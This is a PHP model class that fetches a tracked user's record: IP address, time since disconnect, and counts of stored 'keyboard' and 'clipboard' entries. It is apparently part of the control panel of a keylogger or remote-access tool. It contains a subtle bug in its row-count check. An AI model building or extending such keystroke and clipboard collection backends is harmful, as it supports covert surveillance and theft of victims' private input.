<?php

class Model_User extends Model
{

    public function get_data()
    {
        $result = [];
        $result['state'] = 'no results';

        //#todo change this shit
        date_default_timezone_set('Europe/Kiev');

        if (isset($_GET['uid']))
        {
            if (is_numeric($_GET['uid']))
            {
                $uid = $_GET['uid'];
            }
            else
            {
                return $result;
            }
        }
        else
        {
            return $result;
        }
        
        $stmt = $GLOBALS['DB']->prepare('SELECT * FROM users WHERE id = ?;');
        $stmt->execute(array($uid));
        $rows = $stmt->fetchAll(PDO::FETCH_NAMED);

        if (count($rows) != 0) {

            $result['state'] = 'ok';
            $result['user'] = $rows[0];


            //format disconnect time
            $result['user']['disconnect_time'] = $this->time_elapsed_string($rows[0]['disconnect_time']);

            //format ip address
            $result['user']['ip'] = long2ip($result['user']['ip']);

            //get count of keyboard colums
            $result['keyboardCount'] = $this->get_count('keyboard', $uid);

            //get count of clipboard colums
            $result['clipboardCount'] = $this->get_count('clipboard', $uid);

        }
        return $result;
    }
    private function get_count ($table , $uid){
        $stmt = $GLOBALS['DB']->prepare('SELECT COUNT(*) FROM '.$table.' WHERE user_id = ?;');
        $stmt->execute(array($uid));
        $rows =  $stmt->fetchAll();

        if(count($rows != 0)) {
           return $rows[0][0];
        }
        else {
            return 'no results';
        }
    }

    private function time_elapsed_string($ptime)
    {
        $etime = time() - strtotime($ptime);

        if ($etime < 1)
        {
            return 'bad time zone';
        }

        $secsArray = array(
            24 * 60 * 60  =>  'day',
            60 * 60  =>  'hour',
            60  =>  'minute',
            1  =>  'second'
        );
        $secsArray_plural = array(
            'day'    => 'days',
            'hour'   => 'hours',
            'minute' => 'minutes',
            'second' => 'seconds'
        );

        foreach ($secsArray as $secs => $str)
        {
            $d = $etime / $secs;
            if ($d >= 1)
            {
                $roundedTime = round($d);
                $time =  $roundedTime . ' ' . ($roundedTime > 1 ? $secsArray_plural[$str] : $str).' ago';
                break;
            }
        }

        //return date if period bigger then month
        if(!isset($time)){
            return $ptime;
        }
        else {
            return $time;
        }
    }
}
